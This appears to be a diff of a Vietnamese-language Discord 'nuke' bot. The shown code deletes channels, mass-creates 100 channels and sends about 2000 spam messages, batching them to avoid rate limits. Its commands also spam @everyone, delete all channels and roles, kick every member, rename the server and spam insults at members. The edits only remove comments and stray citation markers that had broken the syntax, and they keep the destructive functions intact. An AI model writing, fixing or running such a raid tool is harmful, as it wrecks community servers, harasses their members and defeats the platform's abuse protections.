@@ -261,7 +261,6 @@ async def execute_nuke(guild):
         if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-        # Tạo ra 100 kênh mới để đạt tổng tiêu chuẩn 2000 tin nhắn (100 kênh x 20 tin nhắn)
         create_tasks = []
         for i in range(100):
             channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
@@ -277,10 +276,9 @@ async def execute_nuke(guild):
             ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
         )
         
-        # Tối ưu hóa việc spam theo từng đợt để tránh bị Rate Limit (Lỗi dừng ở 700 tin)
         valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
         
-        for i in range(20): # 20 vòng lặp, mỗi vòng gửi 1 tin cho tất cả các kênh (Tổng 100 x 20 = 2000 tin)
+        for i in range(20):
             batch_tasks = []
             for channel in valid_channels:
                 async def send_msg(ch=channel):
@@ -293,7 +291,7 @@ async def execute_nuke(guild):
                 batch_tasks.append(send_msg())
             
             await asyncio.gather(*batch_tasks, return_exceptions=True)
-            await asyncio.sleep(0.3) # Độ trễ chống nghẽn mạng / rate limit
+            await asyncio.sleep(0.3)
 
         if log_channel:
             await log_channel.send(embed=discord.Embed(title="✅ Nuke siêu tốc (2000 tin nhắn) hoàn tất bởi Boss Bảo!", color=0x00FF00))
@@ -341,7 +339,7 @@ async def nuke_server(ctx):
 @nuke_server.error
 async def nuke_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")
 
@@ -377,7 +375,7 @@ async def spam_channels(ctx, amount: int = 100):
 @spam_channels.error
 async def spam_channels_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
 
@@ -419,7 +417,7 @@ async def spam_everyone(ctx):
 @spam_everyone.error
 async def spam_everyone_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
 
@@ -472,7 +470,7 @@ async def delete_all_channels(ctx):
 @delete_all_channels.error
 async def delete_all_channels_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
 
@@ -508,7 +506,7 @@ async def spam_roles(ctx, amount: int = 50):
 @spam_roles.error
 async def spam_roles_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
 
@@ -562,7 +560,7 @@ async def delete_all_roles(ctx):
 @delete_all_roles.error
 async def delete_all_roles_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
 
@@ -618,7 +616,7 @@ async def kick_all_members(ctx):
 @kick_all_members.error
 async def kick_all_members_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(e)}")
 
@@ -641,7 +639,7 @@ async def set_server_name(ctx, *, new_name: str):
 @set_server_name.error
 async def set_server_name_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
 
@@ -672,7 +670,7 @@ async def set_server_icon(ctx, url: str = None):
 @set_server_icon.error
 async def set_server_icon_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
 
@@ -761,7 +759,7 @@ async def addowner(ctx, target: discord.User):
 @addowner.error
 async def addowner_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 @bot.command(name="deleteowner")
 @is_bot_owner()
@@ -778,7 +776,7 @@ async def deleteowner(ctx, target: discord.User):
 @deleteowner.error
 async def deleteowner_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 # ==================== LỆNH SPAM CHỬI ====================
 @bot.command(name="spam")
@@ -813,7 +811,7 @@ async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
 @spam.error
 async def spam_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 @bot.command(name="stop")
 @is_bot_owner()
@@ -828,7 +826,7 @@ async def stop_bot(ctx):
 @stop_bot.error
 async def stop_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 # ==================== LỆNH CHANNELSLOG ====================
 @bot.command(name="channelslog")
@@ -845,7 +843,7 @@ async def channelslog(ctx, channel: discord.TextChannel = None):
 @channelslog.error
 async def channelslog_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 # ==================== SỰ KIỆN LOG ====================
 async def send_log(guild_id, embed):
@@ -929,7 +927,7 @@ async def setup(ctx):
 @setup.error
 async def setup_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')[cite: 6]
+        await ctx.send('NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 # ==================== LỆNH STATS ====================
 @bot.command(name="stats")
